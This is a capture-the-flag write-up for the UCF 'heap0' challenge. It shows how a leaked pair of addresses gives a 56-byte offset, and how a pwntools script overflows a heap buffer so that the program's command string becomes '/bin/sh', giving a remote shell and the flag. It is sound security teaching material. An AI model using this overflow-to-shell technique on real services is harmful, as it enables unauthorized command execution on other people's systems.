So we are given an elf, without the source code. However we might not need to reverse it to find out what it does. Let's try just running the program.

```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/heap0$ ./heap0 
username at 0x58518140
shell at 0x58518178
Enter username: guy
Hello, guy. Your shell is /bin/ls.
exploit.py  heap0  libpwnableharness32.so
```

So from here, it first tells us the address of our input (which is username), and the address of the shell. It takes our input, prints it out along with the current value for shell and then runs shell as a system command.
From here it looks like there might be a heap exploit where we can overflow the value of shell. Since they gave us the address of our input, and where we want to override let's find the buffer that we will need to use in order to reach shell.

```
0x58518178 - 0x58518140 = 56
```

Now that we know the buffer, let's see if this exploit exists. We will be trying to set shell equal to "/bin/sh" to give us a shell. Here is the python script to test it.

```
#This imports the pwntools library
from pwn import *

#This sets up the remote connection to the server
conn = remote("ctf.hackucf.org", 7003)

#This recieves the first few lines of text
conn.recvline()
conn.recvline()

#This set's up the payload which we will send
payload = "0"*56 + "/bin/sh"

#This sends the payload
conn.sendline(payload)

#This drops to an interactive shell
conn.interactive()
```

Now let's try the exploit!

```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/heap0$ sudo python exploit.py 
[+] Opening connection to ctf.hackucf.org on port 7003: Done
username at 0x57b0f008

shell at 0x57b0f040

Enter username: Hello, 00000000000000000000000000000000000000000000000000000000/bin/sh. Your shell is /bin/sh.

[*] Switching to interactive mode
$ ls
flag.txt
heap0
$ cat flag.txt
flag{heap_challenges_are_not_as_scary_as_most_people_think}
$ 
[*] Interrupted
[*] Closed connection to ctf.hackucf.org port 7003
```

And just like that, we pwned the binary...
